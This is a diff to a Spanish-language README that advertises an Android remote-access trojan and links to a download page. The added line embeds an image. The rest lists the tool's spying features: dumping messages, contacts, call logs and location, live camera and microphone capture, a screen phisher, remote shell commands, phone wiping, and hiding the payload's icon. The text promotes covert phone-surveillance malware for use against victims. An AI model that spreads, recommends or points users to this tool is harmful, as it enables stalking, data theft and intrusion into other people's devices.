@@ -16,6 +16,8 @@ DESCARGARDE DE:https://nibiruanuna.wixsite.com/android-rat-spy
 ⭐️El constructor agrega mas opciones de aplicaciones falsas
 
 ⭐️Mostrar si el dispositivo es administrador 68747470733a2f2f692e696d6775722e636f6d2f4f69554f55326e2e6a7067 Disponible para rata: https://nibiruanuna.wixsite.com/android-rat-spy
+![68747470733a2f2f692e696d6775722e636f6d2f4f69554f55326e2e6a7067](https://github.com/androidrat2023/AndroidSpy/assets/133962787/647c4d90-1bfb-4d0d-96b4-f488682e1b04)
+
 
 Anti-Borrado Control de pantalla Formatear teléfono Llamada telefónica mensajera tostadora Administrador de archivos Phisher de pantalla Información del sistema de volcado Ubicación de volcado Transmisión de cámara web en vivo Mensajes de volcado Cambiar el modo de audio Volcar registros de llamadas Volcar la hora local Grabación de micrófono Desinstalar aplicación Lista de aplicaciones instaladas Enviar mensaje Volcar contactos Pantalla de bloqueo/desbloqueo Ejecutar de shell comando Instantánea de la cámara web Abre la app Instalar aplicación Información del dispositivo Ocultar/Mostrar el icono de la aplicación de carga útil
 
